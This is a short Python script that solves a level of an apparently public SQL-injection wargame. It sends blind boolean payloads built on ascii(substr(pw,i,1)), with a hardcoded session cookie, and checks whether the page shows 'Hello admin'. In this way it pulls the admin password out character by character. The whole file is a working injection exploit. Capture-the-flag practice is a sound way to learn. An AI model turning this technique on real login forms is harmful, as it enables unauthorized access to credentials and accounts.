import requests
import string

url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
cookies={'PHPSESSID':"be5essatffh7p0j73gj6hl78fk"}
ascii_code=string.digits+string.ascii_letters
utf="utf-8"

print("Find pw is ")
for i in range(1, 9):
    for find in ascii_code:
        params=f"?pw=' or ascii(substr(pw,{str(i)},1))={str(ord(find))}%23"
        find_url=url+params
        response=requests.get(find_url, cookies=cookies)

        if response.text.find("<h2>Hello admin</h2>")>0:
            print(find, end='')
            break

print("\nDONE!")